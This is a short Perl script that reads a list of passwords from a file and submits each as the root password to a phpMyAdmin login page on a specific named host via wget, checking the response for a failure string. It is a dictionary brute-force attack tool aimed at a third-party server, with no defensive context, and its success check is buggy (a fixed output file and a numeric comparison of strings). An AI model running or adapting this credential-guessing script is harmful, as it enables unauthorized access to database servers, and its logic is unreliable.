#!/usr/bin/perl

open FILE, "<wejscie.txt" or die $!;

#my @lines = <FILE>
$n=0;
while (<FILE>) { 
	`wget --save-cookies cookies.txt --post-data "pma_username=root&pma_password=$_"  -O /tmp/index.${n}.html http://z7.ipartner.com.pl/phpmyadmin/ -b`;
	$temp=`cat /tmp/index.1.html |grep Cannot |awk '{print $3}'`;
	print "\n" . $temp . "\n";
	if ($temp == "Cannot" ) 
	{
		print "True " . $temp . "\n";
	}
	else 
	{
		print "False " . $temp . "\n";

	}



	++$n;

} 
close(FILE);
